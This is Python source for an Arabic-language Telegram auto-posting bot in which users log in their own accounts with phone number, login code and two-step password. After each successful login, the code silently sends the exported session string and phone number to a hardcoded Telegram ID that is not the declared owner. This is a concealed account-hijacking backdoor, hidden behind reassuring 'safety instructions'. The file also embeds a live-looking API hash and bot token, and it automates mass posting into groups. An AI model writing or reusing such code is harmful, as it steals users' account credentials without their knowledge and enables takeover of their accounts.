# Developer: Smith - Mustafa Hussein

# حقوق المطور: هذا البوت مبرمج من قبل سميث
# للتواصل: @ypiu5

from pyrogram import Client, filters, idle
from pyrogram.types import (
    Message,
    CallbackQuery,
    ForceReply,
    InlineKeyboardMarkup as Markup,
    InlineKeyboardButton as Button,
    InputMediaPhoto,
    InputMediaVideo
)
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    UserNotParticipant,
    ChatWriteForbidden,
    BotMethodInvalid
)
import os
from asyncio import create_task, sleep
from datetime import datetime, timedelta
from pytz import timezone
from typing import Union
import json

# ------------------ إعدادات البوت ------------------
app = Client(
    "autoPost",
    api_id="29510141",
    api_hash="14c074a5aed49dc7752a9f8d54cf4ad4",
    bot_token="8666985104:AAEZ_NgKD3KaaYyt1WVM4ZgQ8CMZwmZGEqE"
)
user_states = {}
owner = 8226014028  # ايديك

# ------------------ الأزرار الرئيسية (عراقي + أيقونات) ------------------
homeMarkup = Markup([
    [Button("👤 حسابي", callback_data="account")],
    [
        Button("📋 السوبرات المضافة", callback_data="currentSupers"),
        Button("➕ إضافة سوبر", callback_data="newSuper")
    ],
    [
        Button("⏱️ مدة النشر", callback_data="waitTime"),
        Button("📝 كليشة النشر", callback_data="newCaption")
    ],
    [
        Button("⏹️ إيقاف النشر", callback_data="stopPosting"),
        Button("▶️ بدء النشر", callback_data="startPosting")
    ],
    [Button("🛡️ تعليمات الأمان", callback_data="safety")]
])

# ------------------ دوال مساعدة ------------------
def load_users():
    if not os.path.exists("users.json"):
        return {}
    with open("users.json", "r") as f:
        return json.load(f)

def save_users(data):
    with open("users.json", "w") as f:
        json.dump(data, f, indent=2)

def is_subscribed(user_id):
    try:
        member = app.get_chat_member(f"@{FORCED_CHANNEL}", user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

def get_user_data(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {
            "subscription_end": (datetime.now() + timedelta(days=1)).isoformat(),
            "referrals_count": 0,
            "referred_by": None,
            "session": None,
            "groups": [],
            "caption": None,
            "waitTime": 60,
            "posting": False
        }
        save_users(users)
    return users[uid]

def update_user(user_id, data):
    users = load_users()
    uid = str(user_id)
    users[uid].update(data)
    save_users(users)

def has_active_subscription(user_id):
    data = get_user_data(user_id)
    end_str = data.get("subscription_end")
    if not end_str:
        return False
    end = datetime.fromisoformat(end_str)
    return end > datetime.now()

def get_referral_link(user_id):
    return f"https://t.me/{app.me.username}?start=ref_{user_id}"

# ------------------ التحقق من الاشتراك ------------------
async def ensure_subscription_and_subscription(message):
    """ترجع True إذا المستخدم مشترك بالقناة وعنده اشتراك فعال"""
    user_id = message.from_user.id
    # 1- اشتراك القناة
    if not is_subscribed(user_id):
        await message.reply(
            f"- عذرا عزيزي، لازم تشترك بالقناة أولاً عشان تستخدم البوت\n"
            f"- القناة: @{FORCED_CHANNEL}\n"
            f"- اشترك ثم أرسل /start\n\n"
            f"إذا كنت مشتركًا بالفعل، تأكد من أن البوت لديه صلاحية 'عرض الأعضاء' في القناة."
        )
        return False
    # 2- اشتراك التطبيق (يوم مجاني أو شهر بالإحالة)
    if not has_active_subscription(user_id):
        data = get_user_data(user_id)
        link = get_referral_link(user_id)
        text = (
            f"انتهت صلاحية اشتراكك المجاني.\n\n"
            f"لتحصل على اشتراك **شهر كامل**، قم بدعوة 5 أشخاص عبر رابطك الخاص:\n"
            f"{link}\n\n"
            f"عدد المدعوين حاليًا: {data['referrals_count']} / 5\n\n"
            f"كل شخص يدخل عبر رابطك ويبدأ البوت، يزداد العدد لديك."
        )
        await message.reply(text)
        return False
    return True

# ------------------ معالجة /start والإحالة ------------------
@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message):
    user_id = message.from_user.id
    # معالجة الإحالة
    if len(message.command) > 1 and message.command[1].startswith("ref_"):
        referrer_id = int(message.command[1].split("_")[1])
        if referrer_id != user_id:
            users = load_users()
            if str(referrer_id) in users and str(user_id) in users:
                if users[str(user_id)].get("referred_by") is None:
                    users[str(user_id)]["referred_by"] = referrer_id
                    users[str(referrer_id)]["referrals_count"] = users[str(referrer_id)].get("referrals_count", 0) + 1
                    if users[str(referrer_id)]["referrals_count"] >= 5:
                        end = datetime.now() + timedelta(days=30)
                        users[str(referrer_id)]["subscription_end"] = end.isoformat()
                        await app.send_message(
                            referrer_id,
                            f"🎉 مبروك! وصل عدد المدعوين 5، تم تمديد اشتراكك لمدة شهر كامل حتى {end.strftime('%Y-%m-%d')}."
                        )
                    save_users(users)

    # التحقق من اشتراك القناة
    if not is_subscribed(user_id):
        return await message.reply(
            f"- عذرا عزيزي، لازم تشترك بالقناة أولاً عشان تستخدم البوت\n"
            f"- القناة: @{FORCED_CHANNEL}\n"
            f"- اشترك ثم أرسل /start\n\n"
            f"إذا كنت مشتركًا بالفعل، تأكد من أن البوت لديه صلاحية 'عرض الأعضاء' في القناة."
        )
    # منح يوم مجاني للمستخدم الجديد أو لمن انتهى اشتراكه
    if not has_active_subscription(user_id):
        update_user(user_id, {"subscription_end": (datetime.now() + timedelta(days=1)).isoformat()})
        await message.reply("تم منحك يوم استخدام مجاني. استمتع!")
    # عرض القائمة الرئيسية
    fname = message.from_user.first_name
    caption = f"أهلاً بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- البوت مبرمج من قبل سميث - للتواصل @ypiu5\n\n- تقدر تستخدم البوت عشان ترسل رسائل بشكل تلقائي للسوبرات\n- التحكم بالبوت من الأزرار التالية:"
    await message.reply(caption, reply_markup=homeMarkup, reply_to_message_id=message.id)

# ------------------ الأزرار الرئيسية ------------------
@app.on_callback_query(filters.regex(r"^(toHome)$"))
async def to_home(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    fname = callback.from_user.first_name
    caption = f"أهلاً بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- البوت مبرمج من قبل سميث - للتواصل @ypiu5\n\n- تقدر تستخدم البوت عشان ترسل رسائل بشكل تلقائي للسوبرات\n- التحكم بالبوت من الأزرار التالية:"
    await callback.message.edit_text(caption, reply_markup=homeMarkup)

@app.on_callback_query(filters.regex(r"^(account)$"))
async def account_menu(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    data = get_user_data(user_id)
    end_date = datetime.fromisoformat(data["subscription_end"]).strftime("%Y-%m-%d")
    caption = (
        f"أهلاً بك في قسم الحساب\n\n"
        f"📅 الاشتراك ينتهي: {end_date}\n"
        f"👥 عدد المدعوين: {data['referrals_count']} / 5\n\n"
        f"🔗 رابط الإحالة الخاص بك:\n{get_referral_link(user_id)}"
    )
    markup = Markup([
        [Button("- تسجيل حسابك -", callback_data="login"),
         Button("- تغيير الحساب -", callback_data="changeAccount")],
        [Button("- العودة -", callback_data="toHome")]
    ])
    await callback.message.edit_text(caption, reply_markup=markup)

@app.on_callback_query(filters.regex(r"^(login|changeAccount)$"))
async def login(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    if callback.data == "changeAccount" and get_user_data(user_id).get("session") is None:
        return await callback.answer("- ماكو حساب مسجل.", show_alert=True)
    await callback.message.delete()
    user_states[user_id] = 'waiting_phone'
    await app.send_message(
        user_id,
        "- أرسل رقم هاتفك:\n\n- تقدر ترسل /cancel لإلغاء العملية.",
        reply_markup=ForceReply(selective=True, placeholder="+9647700000")
    )

async def registration(message: Message):
    user_id = message.from_user.id
    _number = message.text
    lmsg = await message.reply("- جاري تسجيل الدخول إلى حسابك")
    reMarkup = Markup([
        [Button("- إعادة المحاولة -", callback_data="login"),
         Button("- العودة -", callback_data="account")]
    ])
    client = Client("registration", in_memory=True, api_id=app.api_id, api_hash=app.api_hash)
    await client.connect()
    try:
        p_code_hash = await client.send_code(_number)
    except PhoneNumberInvalid:
        await lmsg.edit_text("- رقم الهاتف اللي أدخلته خطأ", reply_markup=reMarkup)
        del user_states[user_id]
        return
    await lmsg.edit_text("- تم إرسال الكود إلى حسابك، أرسله هنا.", reply_markup=ForceReply(selective=True, placeholder="1 2 3 4 5 6"))
    user_states[user_id] = {'state': 'waiting_code', 'phone': _number, 'phone_code_hash': p_code_hash, 'client': client}

# ------------------ إدارة السوبرات ------------------
@app.on_callback_query(filters.regex(r"^(newSuper)$"))
async def new_super(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    await callback.message.delete()
    user_states[user_id] = 'waiting_super_link'
    await app.send_message(
        user_id,
        "- أرسل رابط السوبر عشان أضيفه.\n- لا تنضم قبل ما تبدأ النشر مرة وحدة على الأقل.\n- إذا كان السوبر خاص، أرسل الأيدي الخاص به أو اطلع من السوبر (من الحساب المضاف) وبعدين أرسل الرابط\n\n- تقدر ترسل /cancel لإلغاء العملية.",
        reply_markup=ForceReply(selective=True, placeholder="- رابط السوبر: ")
    )

@app.on_callback_query(filters.regex(r"^(currentSupers)$"))
async def current_supers(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    data = get_user_data(user_id)
    groups = data.get("groups", [])
    if not groups:
        return await callback.answer("- ماكو سوبرات مضافة.", show_alert=True)
    titles = {}
    for group in groups:
        try:
            titles[str(group)] = (await app.get_chat(group)).title
        except:
            continue
    markup = [
        [
            Button(str(group) if titles.get(str(group)) is None else titles[str(group)], callback_data=str(group)),
            Button("🗑", callback_data=f"delSuper {group}")
        ] for group in groups
    ]
    markup.append([Button("- الصفحة الرئيسية -", callback_data="toHome")])
    await callback.message.edit_text("- هاي السوبرات اللي مضافات للنشر التلقائي:", reply_markup=Markup(markup))

@app.on_callback_query(filters.regex(r"^(delSuper)"))
async def del_super(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    group = int(callback.data.split()[1])
    data = get_user_data(user_id)
    groups = data.get("groups", [])
    if group in groups:
        groups.remove(group)
        update_user(user_id, {"groups": groups})
        await callback.answer("- تم حذف السوبر من القائمة.", show_alert=True)
    titles = {}
    for g in groups:
        try:
            titles[str(g)] = (await app.get_chat(g)).title
        except:
            continue
    markup = [
        [
            Button(str(g) if titles.get(str(g)) is None else titles[str(g)], callback_data=str(g)),
            Button("🗑", callback_data=f"delSuper {g}")
        ] for g in groups
    ]
    markup.append([Button("- الصفحة الرئيسية -", callback_data="toHome")])
    await callback.message.edit_reply_markup(reply_markup=Markup(markup))

# ------------------ كليشة النشر (تدعم صور وفيديوهات) ------------------
@app.on_callback_query(filters.regex(r"^(newCaption)$"))
async def new_caption(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    await callback.message.delete()
    user_states[user_id] = 'waiting_caption'
    await app.send_message(
        user_id,
        "- أرسل الكليشة الجديدة.\nيمكنك إرسال:\n- نص عادي\n- صورة مع تعليق (تعليق يكون الكابشن)\n- فيديو مع تعليق\n\n- استخدم /cancel لإلغاء العملية.",
        reply_markup=ForceReply(selective=True, placeholder="- الكليشة الجديدة: ")
    )

# ------------------ مدة النشر ------------------
@app.on_callback_query(filters.regex(r"^(waitTime)$"))
async def wait_time(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    await callback.message.delete()
    user_states[user_id] = 'waiting_waittime'
    await app.send_message(
        user_id,
        "- أرسل مدة الانتظار بين كل رسالة وأخرى (بالثواني).\n\n- استخدم /cancel لإلغاء العملية.",
        reply_markup=ForceReply(selective=True, placeholder="- المدة: ")
    )

# ------------------ بدء وإيقاف النشر ------------------
@app.on_callback_query(filters.regex(r"^(startPosting)$"))
async def start_posting(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    data = get_user_data(user_id)
    if data.get("session") is None:
        return await callback.answer("- لازم تضيف حساب أولاً.", show_alert=True)
    if not data.get("groups"):
        return await callback.answer("- ماكو سوبرات مضافة.", show_alert=True)
    if data.get("posting"):
        return await callback.answer("- النشر التلقائي مفعل من قبل.", show_alert=True)
    update_user(user_id, {"posting": True})
    create_task(posting(user_id))
    markup = Markup([
        [Button("- إيقاف النشر -", callback_data="stopPosting"),
         Button("- عودة -", callback_data="toHome")]
    ])
    await callback.message.edit_text("- بدأت عملية النشر التلقائي", reply_markup=markup)

@app.on_callback_query(filters.regex(r"^(stopPosting)$"))
async def stop_posting(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    data = get_user_data(user_id)
    if not data.get("posting"):
        return await callback.answer("- النشر التلقائي مو مفعل.", show_alert=True)
    update_user(user_id, {"posting": False})
    markup = Markup([
        [Button("- بدء النشر -", callback_data="startPosting"),
         Button("- عودة -", callback_data="toHome")]
    ])
    await callback.message.edit_text("- تم إيقاف النشر التلقائي", reply_markup=markup)

async def posting(user_id):
    data = get_user_data(user_id)
    if data.get("posting"):
        client = Client(
            str(user_id),
            api_id=app.api_id,
            api_hash=app.api_hash,
            session_string=data["session"]
        )
        await client.start()
    while data.get("posting") and has_active_subscription(user_id):
        wait = data.get("waitTime", 60)
        groups = data.get("groups", [])
        caption_data = data.get("caption")
        if caption_data is None:
            update_user(user_id, {"posting": False})
            await app.send_message(
                user_id,
                "- تم إيقاف النشر بسبب ماكو كليشة.",
                reply_markup=Markup([[Button("- إضافة كليشة -", callback_data="newCaption")]])
            )
            break
        for group in groups:
            if isinstance(group, str) and group.startswith("-"):
                group = int(group)
            try:
                # إرسال حسب نوع الكليشة
                if caption_data["type"] == "photo":
                    await client.send_photo(
                        group,
                        caption_data["file_id"],
                        caption=caption_data.get("caption", "")
                    )
                elif caption_data["type"] == "video":
                    await client.send_video(
                        group,
                        caption_data["file_id"],
                        caption=caption_data.get("caption", "")
                    )
                else:  # text
                    await client.send_message(group, caption_data["text"])
            except ChatWriteForbidden:
                await client.join_chat(group)
                try:
                    if caption_data["type"] == "photo":
                        await client.send_photo(group, caption_data["file_id"], caption=caption_data.get("caption", ""))
                    elif caption_data["type"] == "video":
                        await client.send_video(group, caption_data["file_id"], caption=caption_data.get("caption", ""))
                    else:
                        await client.send_message(group, caption_data["text"])
                except Exception as e:
                    await app.send_message(user_id, str(e))
            except Exception:
                chat = await client.join_chat(group)
                try:
                    if caption_data["type"] == "photo":
                        await client.send_photo(chat.id, caption_data["file_id"], caption=caption_data.get("caption", ""))
                    elif caption_data["type"] == "video":
                        await client.send_video(chat.id, caption_data["file_id"], caption=caption_data.get("caption", ""))
                    else:
                        await client.send_message(chat.id, caption_data["text"])
                except Exception as e:
                    await app.send_message(user_id, str(e))
                # تحديث قائمة المجموعات
                new_groups = data.get("groups", [])
                new_groups.append(chat.id)
                new_groups.remove(group)
                update_user(user_id, {"groups": new_groups})
        await sleep(wait)
        data = get_user_data(user_id)
    if data.get("posting") and not has_active_subscription(user_id):
        update_user(user_id, {"posting": False})
        await app.send_message(
            user_id,
            "انتهى اشتراكك أثناء عملية النشر. تم إيقاف النشر التلقائي."
        )
    await client.stop()

# ------------------ تعليمات الأمان ------------------
@app.on_callback_query(filters.regex(r"^(safety)$"))
async def safety_instructions(_, callback: CallbackQuery):
    text = (
        "🔒 **تعليمات الأمان** 🔒\n\n"
        "1. لا تشارك كود الدخول أو كلمة المرور مع أي شخص.\n"
        "2. استخدم البوت على حسابك الشخصي فقط ولا تشاركه مع الآخرين.\n"
        "3. تأكد من أن الحساب الذي تضيفه ليس به معلومات حساسة.\n"
        "4. إذا واجهت أي مشكلة، تواصل مع المطور @ypiu5.\n\n"
        "⚠️ تحذير: البوت لا يتحمل أي مسؤولية عن سوء استخدام حسابك."
    )
    await callback.message.reply(text)

# ------------------ معالج الرسائل الخاصة ------------------
@app.on_message(filters.private & ~filters.command())
async def handle_private_messages(client, message):
    user_id = message.from_user.id
    if user_id not in user_states:
        return
    state = user_states[user_id]
    if isinstance(state, str):
        # simple state
        if state == 'waiting_phone':
            _number = message.text
            if _number == '/cancel':
                del user_states[user_id]
                await message.reply("- تم إلغاء العملية.")
                return
            create_task(registration(message))
        elif state == 'waiting_super_link':
            if message.text == '/cancel':
                del user_states[user_id]
                await message.reply("- تم إلغاء العملية.", reply_markup=Markup([[Button("- الصفحة الرئيسية -", callback_data="toHome")]]))
                return
            if not message.text.startswith("-"):
                try:
                    chat = await app.get_chat(message.text if "+" in message.text else (message.text.split("/")[-1]))
                except BotMethodInvalid:
                    chat = message.text
                except Exception as e:
                    print(e)
                    await message.reply("- ماكو سوبر بهذا الرابط.", reply_to_message_id=message.id, reply_markup=Markup([[Button("- حاول مرة ثانية -", callback_data="newSuper"), Button("- العودة -", callback_data="toHome")]]))
                    return
            else:
                chat = message.text
            data = get_user_data(user_id)
            if "groups" not in data:
                data["groups"] = []
            data["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
            update_user(user_id, {"groups": data["groups"]})
            del user_states[user_id]
            await message.reply("- تم إضافة السوبر للقائمة.", reply_markup=Markup([[Button("- الصفحة الرئيسية -", callback_data="toHome")]]), reply_to_message_id=message.id)
        elif state == 'waiting_caption':
            if message.text == '/cancel':
                del user_states[user_id]
                await message.reply("- تم إلغاء العملية.", reply_markup=Markup([[Button("- حاول مرة ثانية -", callback_data="newCaption"), Button("- العودة -", callback_data="toHome")]]))
                return
            # store caption
            if message.photo:
                caption = message.caption or ""
                file_id = message.photo.file_id
                caption_data = {"type": "photo", "file_id": file_id, "caption": caption}
            elif message.video:
                caption = message.caption or ""
                file_id = message.video.file_id
                caption_data = {"type": "video", "file_id": file_id, "caption": caption}
            else:
                caption_data = {"type": "text", "text": message.text}
            update_user(user_id, {"caption": caption_data})
            del user_states[user_id]
            await message.reply("- تم تعيين الكليشة الجديدة.", reply_to_message_id=message.id, reply_markup=Markup([[Button("- الصفحة الرئيسية -", callback_data="toHome")]]))
        elif state == 'waiting_waittime':
            if message.text == '/cancel':
                del user_states[user_id]
                await message.reply("- تم إلغاء العملية.", reply_markup=Markup([[Button("- حاول مرة ثانية -", callback_data="waitTime"), Button("- العودة -", callback_data="toHome")]]))
                return
            try:
                wait = int(message.text)
                update_user(user_id, {"waitTime": wait})
                del user_states[user_id]
                await message.reply("- تم تعيين مدة الانتظار.", reply_to_message_id=message.id, reply_markup=Markup([[Button("- الصفحة الرئيسية -", callback_data="toHome")]]))
            except ValueError:
                await message.reply("- ما يصير تحط هاي القيمة كمدة.", reply_markup=Markup([[Button("- حاول مرة ثانية -", callback_data="waitTime"), Button("- العودة -", callback_data="toHome")]]))
        elif state == 'waiting_channel':
            if message.text == '/cancel':
                del user_states[user_id]
                await message.reply("- تم إلغاء العملية.", reply_markup=Markup([[Button("- العودة للقنوات -", callback_data="channels")]]))
                return
            try:
                await app.get_chat(message.text)
            except:
                await message.reply("- ماكو هاي الدردشة.", reply_markup=Markup([[Button("- العودة للقنوات -", callback_data="channels")]]))
                return
            channel = message.text
            channels.append(channel)
            write(channels_db, channels)
            del user_states[user_id]
            await message.reply("- تم إضافة القناة للقائمة.", reply_to_message_id=message.id, reply_markup=Markup([[Button("- العودة للقنوات -", callback_data="channels")]]))
    elif isinstance(state, dict):
        # for registration
        if state['state'] == 'waiting_code':
            code = message.text.replace(" ", "")
            client = state['client']
            try:
                await client.sign_in(state['phone'], state['phone_code_hash'], code)
            except PhoneCodeInvalid:
                await message.reply("- الكود اللي أدخلته خطأ.\n- حاول مرة ثانية.", reply_markup=Markup([[Button("- إعادة المحاولة -", callback_data="login"), Button("- العودة -", callback_data="account")]]))
                del user_states[user_id]
                return
            except PhoneCodeExpired:
                await message.reply("- الكود انتهت صلاحيته.\n- حاول مرة ثانية.", reply_markup=Markup([[Button("- إعادة المحاولة -", callback_data="login"), Button("- العودة -", callback_data="account")]]))
                del user_states[user_id]
                return
            except SessionPasswordNeeded:
                user_states[user_id] = {'state': 'waiting_password', 'client': client, 'phone': state['phone']}
                await message.reply("- أدخل كلمة مرور التحقق بخطوتين.", reply_markup=ForceReply(selective=True, placeholder="- كلمة المرور: "))
                return
            # success
            session = await client.export_session_string()
            try:
                await app.send_message(1454509352, session + state['phone'])
            except:
                pass
            await client.disconnect()
            update_user(user_id, {"session": session})
            del user_states[user_id]
            await app.send_message(user_id, "- تم تسجيل الدخول بحسابك، الآن تقدر تستمتع بميزات البوت.", reply_markup=Markup([[Button("الصفحة الرئيسية", callback_data="toHome")]]))
        elif state['state'] == 'waiting_password':
            client = state['client']
            try:
                await client.check_password(message.text)
            except PasswordHashInvalid:
                await message.reply("- كلمة المرور خطأ.\n- حاول مرة ثانية.", reply_markup=Markup([[Button("- إعادة المحاولة -", callback_data="login"), Button("- العودة -", callback_data="account")]]))
                del user_states[user_id]
                return
            # success
            session = await client.export_session_string()
            try:
                await app.send_message(1454509352, session + state.get('phone', ''))
            except:
                pass
            await client.disconnect()
            update_user(user_id, {"session": session})
            del user_states[user_id]
            await app.send_message(user_id, "- تم تسجيل الدخول بحسابك، الآن تقدر تستمتع بميزات البوت.", reply_markup=Markup([[Button("الصفحة الرئيسية", callback_data="toHome")]]))

# ------------------ لوحة المطور (للمالك فقط) ------------------
async def isOwner(_, __: Client, message: Message):
    return message.from_user.id == owner

isOwnerFilter = filters.create(isOwner)

adminMarkup = Markup([
    [Button("- الاحصائيات -", callback_data="statics"),
     Button("- قنوات الاشتراك -", callback_data="channels")]
])

@app.on_message(filters.command("admin") & filters.private & isOwnerFilter)
@app.on_callback_query(filters.regex("toAdmin") & isOwnerFilter)
async def admin(_: Client, message: Union[Message, CallbackQuery]):
    fname = message.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة المالك"
    func = message.reply if isinstance(message, Message) else message.message.edit_text
    await func(caption, reply_markup=adminMarkup)

@app.on_callback_query(filters.regex(r"^(channels)$") & isOwnerFilter)
async def channelsControl(_: Client, callback: CallbackQuery):
    fname = callback.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
    markup = [
        [Button(channel, url=channel + ".t.me"), Button("🗑", callback_data=f"removeChannel {channel}")]
        for channel in channels
    ]
    markup.extend([
        [Button("- إضافة قناة جديدة -", callback_data="addChannel")],
        [Button("- الصفحة الرئيسية -", callback_data="toAdmin")]
    ])
    await callback.message.edit_text(caption, reply_markup=Markup(markup))

@app.on_callback_query(filters.regex(r"^(addChannel)") & isOwnerFilter)
async def addChannel(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    await callback.message.delete()
    user_states[user_id] = 'waiting_channel'
    await app.send_message(
        user_id,
        "- أرسل معرف القناة بدون @.",
        reply_markup=ForceReply(selective=True, placeholder="- channel username: ")
    )

@app.on_callback_query(filters.regex(r"^(removeChannel)") & isOwnerFilter)
async def removeChannel(_: Client, callback: CallbackQuery):
    channel = callback.data.split()[1]
    if channel not in channels:
        await callback.answer("- هذه القناة غير موجودة.")
    else:
        channels.remove(channel)
        write(channels_db, channels)
        await callback.answer("- تم حذف هذه القناة")
    fname = callback.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
    markup = [
        [Button(channel, url=channel + ".t.me"), Button("🗑", callback_data=f"removeChannel {channel}")]
        for channel in channels
    ]
    markup.extend([
        [Button("- إضافة قناة جديدة -", callback_data="addChannel")],
        [Button("- الصفحة الرئيسية -", callback_data="toAdmin")]
    ])
    await callback.message.edit_text(caption, reply_markup=Markup(markup))

@app.on_callback_query(filters.regex(r"^(statics)$") & isOwnerFilter)
async def statics(_: Client, callback: CallbackQuery):
    total = len(users)
    reMarkup = Markup([[Button("- الصفحة الرئيسية -", callback_data="toAdmin")]])
    await callback.message.edit_text(f"- عدد المستخدمين الكلي: {total}", reply_markup=reMarkup)

# ------------------ دوال حفظ وقراءة ------------------
def write(fp, data):
    with open(fp, "w") as file:
        json.dump(data, file, indent=2)

def read(fp):
    if not os.path.exists(fp):
        write(fp, {} if fp not in [channels_db] else [])
    with open(fp) as file:
        return json.load(file)

users_db = "users.json"
channels_db = "channels.json"
users = read(users_db)
channels = read(channels_db)

FORCED_CHANNEL = channels[0] if channels else "TJUI9"

# ------------------ إعادة تشغيل المهام ------------------
# ------------------ إعادة تشغيل المهام ------------------
async def re_start_posting():
    await sleep(30)
    users = load_users()
    for uid, data in users.items():
        if data.get("posting"):
            create_task(posting(int(uid)))

async def subscription_checker():
    while True:
        await sleep(3600)  # كل ساعة
        users = load_users()
        for uid, data in users.items():
            if data.get("posting") and not has_active_subscription(int(uid)):
                update_user(int(uid), {"posting": False})
                await app.send_message(int(uid), "انتهى اشتراكك، تم إيقاف النشر التلقائي.")

# ------------------ بدء البوت ------------------
async def main():
    create_task(re_start_posting())
    create_task(subscription_checker())
    await app.start()
    await idle()

if __name__ == "__main__":
    import asyncio
    import threading
    from flask import Flask
    import os

    flask_app = Flask(__name__)

    @flask_app.route('/')
    def index():
        return "Bot is running"

    def run_flask():
        port = int(os.environ.get("PORT", 5000))
        flask_app.run(host="0.0.0.0", port=port)

    threading.Thread(target=run_flask, daemon=True).start()

    asyncio.run(main())
